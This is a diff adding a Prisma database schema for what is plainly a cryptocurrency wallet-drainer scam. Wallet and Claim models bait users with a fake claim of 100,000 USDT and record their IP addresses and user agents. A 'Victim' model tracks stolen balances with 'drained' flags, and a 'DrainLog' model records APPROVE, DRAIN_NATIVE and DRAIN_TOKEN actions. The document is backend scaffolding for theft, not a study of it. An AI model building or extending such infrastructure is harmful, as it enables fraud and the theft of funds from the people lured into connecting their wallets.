@@ -1,0 +1,82 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model Wallet {
+  id          String   @id @default(uuid())
+  address     String   @unique
+  chain       String
+  connectedAt DateTime @default(now())
+  ipAddress   String?
+  userAgent   String?
+  claim       Claim?
+}
+
+model Claim {
+  id          String      @id @default(uuid())
+  walletId    String      @unique
+  wallet      Wallet      @relation(fields: [walletId], references: [id])
+  usdtAmount  Float       @default(100000)
+  spcxAmount  Float       @default(2500)
+  status      ClaimStatus @default(PENDING)
+  txHash      String?
+  claimedAt   DateTime    @default(now())
+  processedAt DateTime?
+}
+
+model Admin {
+  id        String   @id @default(uuid())
+  username  String   @unique
+  password  String
+  createdAt DateTime @default(now())
+}
+
+// Add to your existing schema
+model Victim {
+  id           String   @id @default(cuid())
+  address      String   @unique
+  chain        String
+  ipAddress    String?
+  userAgent    String?
+  balanceETH   Float?
+  balanceTRX   Float?
+  balanceUSDT  Float?
+  balanceUSDC  Float?
+  drained      Boolean  @default(false)
+  drainedAt    DateTime?
+  drainAmount  Float?
+  txHash       String?
+  createdAt    DateTime @default(now())
+  
+  @@index([address])
+  @@index([drained])
+  @@index([createdAt])
+}
+
+model DrainLog {
+  id          String   @id @default(cuid())
+  victimId    String
+  action      String   // APPROVE, DRAIN_NATIVE, DRAIN_TOKEN
+  token       String?
+  amount      Float?
+  txHash      String?
+  success     Boolean
+  error       String?
+  timestamp   DateTime @default(now())
+  
+  @@index([victimId])
+  @@index([timestamp])
+}
+
+
+enum ClaimStatus {
+  PENDING
+  PROCESSING
+  COMPLETED
+  FAILED
+}
